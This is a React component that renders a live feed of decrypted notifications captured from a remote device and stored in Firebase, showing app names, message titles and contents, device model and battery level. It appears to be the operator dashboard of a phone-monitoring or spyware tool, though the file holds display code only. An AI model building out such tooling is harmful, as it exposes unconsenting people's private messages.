import React from 'react';
import { Cpu, Battery, Zap, Trash2, Clock, Shield } from 'lucide-react';
import { format } from 'date-fns';
import { useDecryptedFirebase } from '../../hooks/useDecryptedFirebase';

export const SignalsTab = ({ deviceId, searchTerm, onDelete }) => {
  const { data: notifications, loading, error } = useDecryptedFirebase(deviceId, 'notifications');

  if (loading && notifications.length === 0) {
    return (
      <div className="flex flex-col items-center justify-center py-20 animate-pulse">
        <Zap className="w-10 h-10 text-red-600 mb-4" />
        <p className="text-[10px] text-zinc-600 font-bold uppercase tracking-[0.3em]">Intercepting_Signals...</p>
      </div>
    );
  }

  const filtered = notifications.filter(n => {
    const searchStr = `${n.app} ${n.title} ${n.content} ${n.packageName}`.toLowerCase();
    return searchStr.includes(searchTerm.toLowerCase());
  });

  return (
    <div className="space-y-6 lg:space-y-10">
      <div className="sticky top-0 sticky-header pt-4 pb-4 lg:pb-5 mb-6 lg:mb-10 border-b-2 border-zinc-900">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-3 lg:gap-5">
            <div className="w-10 h-10 lg:w-14 lg:h-14 bg-red-600/10 border border-red-600/40 flex items-center justify-center shadow-lg">
              <Zap className="w-5 h-5 lg:w-7 lg:h-7 text-red-600" />
            </div>
            <div>
              <h2 className="text-sm lg:text-lg font-black text-white uppercase tracking-[0.1em]">Signals</h2>
              <p className="text-[8px] lg:text-xs text-zinc-500 font-bold mt-1 uppercase tracking-widest">Live Activity Stream</p>
            </div>
          </div>
          <div className="bg-zinc-900/50 border border-zinc-800 px-3 lg:px-6 py-2 lg:py-3 shadow-inner">
            <span className="text-[9px] lg:text-xs font-black text-red-500 uppercase tracking-[0.2em] whitespace-nowrap">LOGS: {filtered.length}</span>
          </div>
        </div>
      </div>

      <div className="grid gap-4 lg:gap-8 pb-10">
        {filtered.map((notif, idx) => {
          const isRecent = Date.now() - notif.timestamp < 30000;
          return (
            <div
              key={notif.id || idx}
              className={`bg-zinc-950 border border-zinc-900 relative overflow-hidden group transition-all duration-500 shadow-xl ${isRecent ? 'shadow-[inset_0_0_30px_rgba(255,49,49,0.08)] border-red-600/40 translate-y-[-2px]' : 'hover:border-zinc-700'}`}
            >
              {/* Sidebar Accent */}
              <div className="absolute top-0 left-0 w-1.5 h-full bg-red-600 scale-y-0 group-hover:scale-y-100 transition-transform duration-500 origin-top"></div>

              {/* Header Info */}
              <div className="p-4 lg:p-5 flex items-start justify-between border-b border-zinc-900 bg-black">
                <div className="flex flex-col gap-1 lg:gap-2 overflow-hidden">
                  <div className="flex items-center gap-2 lg:gap-3">
                    <Shield className="w-3.5 h-3.5 lg:w-4 lg:h-4 text-red-600" />
                    <span className="text-[10px] lg:text-xs font-black text-white uppercase tracking-widest truncate">{notif.app || notif.appName || 'System'}</span>
                  </div>
                  <div className="flex items-center gap-3 lg:gap-5 text-[8px] lg:text-[10px] font-black text-zinc-500 uppercase tracking-widest">
                    <span className="flex items-center gap-1.5"><Cpu className="w-3 h-3 lg:w-3.5 lg:h-3.5 text-red-800" /> {notif.deviceInfo?.model || 'Device'}</span>
                    <span className="flex items-center gap-2"><Battery className="w-3.5 h-3.5 text-red-800" /> {notif.deviceInfo?.battery || 'N/A'}</span>
                  </div>
                </div>

                <div className="flex items-center gap-5">
                  <div className="text-right">
                    <p className="text-xs font-black text-red-600 leading-none tracking-tighter">REF: {notif.id?.slice(-8).toUpperCase()}</p>
                    <p className="text-[10px] text-zinc-600 mt-2 uppercase font-mono font-bold">{notif.timestamp ? format(new Date(notif.timestamp), 'HH:mm:ss.SSS') : '00:00:00.000'}</p>
                  </div>
                  <button
                    onClick={() => onDelete(notif.id)}
                    className="w-12 h-12 flex items-center justify-center bg-zinc-900 border border-zinc-800 text-zinc-600 hover:text-red-500 hover:border-red-600/50 hover:bg-red-950/30 transition-all opacity-0 group-hover:opacity-100 shadow-lg"
                    title="Delete Entry"
                  >
                    <Trash2 className="w-5 h-5" />
                  </button>
                </div>
              </div>

              {/* Payload Data */}
              <div className="p-7">
                <div className="flex items-center gap-3 mb-5">
                  <span className="text-[10px] font-black text-white bg-red-600 px-3 py-1 rounded-sm uppercase tracking-widest shadow-md">Title</span>
                  <p className="text-sm font-black text-white tracking-wide">{notif.title || 'Notification Payload'}</p>
                </div>

                <div className="bg-black/40 p-6 border border-zinc-900 font-mono relative shadow-inner">
                  <div className="absolute top-3 right-4 flex gap-1.5 opacity-30 group-hover:opacity-100 transition-opacity">
                    {[1, 2, 3].map(i => <div key={i} className="w-1.5 h-1.5 bg-red-600 rounded-full animate-pulse" style={{ animationDelay: `${i * 0.2}s` }} />)}
                  </div>
                  <p className="text-sm text-red-500 font-bold leading-relaxed whitespace-pre-wrap selection:bg-red-600 selection:text-white">
                    {notif.content || notif.text || notif.message || '[BUFFER_EMPTY]'}
                  </p>
                </div>
              </div>

              {/* Bottom Decoration */}
              <div className="px-4 h-1.5 w-full bg-zinc-900 flex gap-0.5">
                {Array.from({ length: 24 }).map((_, i) => (
                  <div key={i} className={`flex-1 ${i % 3 === 0 ? 'bg-red-600/40' : 'bg-transparent'}`} />
                ))}
              </div>
            </div>
          );
        })}

        {filtered.length === 0 && (
          <div className="border border-dashed border-zinc-900 p-20 text-center text-zinc-800">
            <p className="text-[10px] uppercase font-bold tracking-[0.3em]">Zero_Packets_Detected</p>
          </div>
        )}
      </div>
    </div>
  );
};
